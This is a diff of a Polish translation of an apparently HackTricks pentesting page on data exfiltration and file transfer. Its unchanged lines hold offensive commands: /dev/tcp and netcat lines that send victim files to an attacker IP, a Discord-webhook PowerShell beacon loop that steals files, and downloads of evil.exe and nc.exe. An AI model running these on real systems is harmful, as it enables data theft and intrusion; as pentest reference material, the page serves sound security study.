@@ -2,9 +2,16 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
+> [!TIP]
+> Aby zobaczyć kompletny przykład end-to-end, w którym staging loot odbywa się w `C:\Users\Public`, a exfiltrating odbywa się za pomocą Rclone w celu naśladowania legalnych kopii zapasowych, przejrzyj poniższy workflow.
+
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
 ## Commonly whitelisted domains to exfiltrate information
 
-Sprawdź [https://lots-project.com/](https://lots-project.com/), aby znaleźć powszechnie dozwolone (whitelisted) domeny, które można wykorzystać
+Sprawdź [https://lots-project.com/](https://lots-project.com/), aby znaleźć domeny często umieszczane na białych listach, które można nadużyć
 
 ## Copy\&Paste Base64
 
@@ -59,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **Serwer HTTPS**
+### **HTTPS Serwer**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -100,14 +107,14 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+## Webhooks (Discord/Slack/Teams) dla C2 & Data Exfiltration
 
-Webhooks są punktami końcowymi HTTPS tylko do zapisu, które akceptują JSON i opcjonalne części plików. Zwykle są dozwolone dla zaufanych domen SaaS i nie wymagają OAuth/API keys, co czyni je przydatnymi do niskotarciowego beaconing i exfiltration.
+Webhooks to write-only HTTPS endpoints, które akceptują JSON i opcjonalne części plików. Zwykle są dozwolone na zaufanych domenach SaaS i nie wymagają OAuth/API keys, co czyni je przydatnymi do low-friction beaconing i exfiltration.
 
 Key ideas:
-- Punkt końcowy: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- Endpoint: Discord używa https://discord.com/api/webhooks/<id>/<token>
 - POST multipart/form-data z częścią nazwaną payload_json zawierającą {"content":"..."} oraz opcjonalną częścią pliku nazwaną file.
-- Wzorzec pętli operatora: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK potwierdzają dostarczenie.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK potwierdzają dostarczenie.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -177,9 +184,9 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-Notatki:
-- Podobne wzorce dotyczą innych platform współpracy (Slack/Teams) korzystających z incoming webhooks; dostosuj URL i JSON schema odpowiednio.
-- Dla DFIR artefaktów cache Discord Desktop i odzyskiwania webhook/API, zobacz:
+Uwagi:
+- Podobne wzorce dotyczą innych platform współpracy (Slack/Teams) używających incoming webhooks; odpowiednio dostosuj URL i JSON schema.
+- W przypadku DFIR związanych z Discord Desktop cache artifacts i odzyskiwaniem webhook/API, zobacz:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -192,7 +199,7 @@ Notatki:
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP serwer (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -235,7 +242,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Albo utwórz udział smb **korzystając z samba**:
+Lub utwórz smb share **używając samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -266,7 +273,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Jeśli ofiara ma SSH, atakujący może zamontować katalog z maszyny ofiary na swoją.
+Jeśli ofiara ma SSH, atakujący może zamontować katalog z maszyny ofiary na maszynie atakującego.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -279,7 +286,7 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Pobierz plik z ofiary
+### Pobierz plik z victim
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -313,13 +320,13 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Jeśli możesz wysyłać dane do serwera SMTP, możesz stworzyć serwer SMTP w pythonie, aby odbierać te dane:
+Jeśli możesz wysyłać dane do SMTP server, możesz utworzyć SMTP, który odbierze dane przy użyciu python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Domyślnie w XP i 2003 (w innych należy go jawnie dodać podczas instalacji)
+Domyślnie w XP i 2003 (w innych trzeba go jawnie dodać podczas instalacji)
 
 W Kali, **uruchom serwer TFTP**:
 ```bash
@@ -328,18 +335,18 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Serwer TFTP w Pythonie:**
+**Serwer TFTP w python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Na **victim** połącz się z serwerem Kali:
+W **victim** połącz się z serwerem Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Pobierz plik za pomocą PHP oneliner:
+Pobierz plik przy użyciu PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` nie tylko pozwala na inspekcję plików binary, ale ma też **możliwość odbudowy ich z hex**. Oznacza to, że dostarczając hex pliku binary, `debug.exe` może wygenerować plik binary. Warto jednak zauważyć, że `debug.exe` ma **ograniczenie składania plików do 64 kb**.
+Program `debug.exe` nie tylko umożliwia inspekcję plików binary, lecz także ma **możliwość odbudowy ich z hex**. Oznacza to, że podając hex pliku binary, `debug.exe` może wygenerować plik binary. Jednak warto zauważyć, że `debug.exe` ma **ograniczenie składania plików do rozmiaru 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Następnie wklej tekst do windows-shell, a plik o nazwie nc.exe zostanie utworzony.
+Następnie skopiuj i wklej tekst do windows-shell, a plik o nazwie nc.exe zostanie utworzony.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
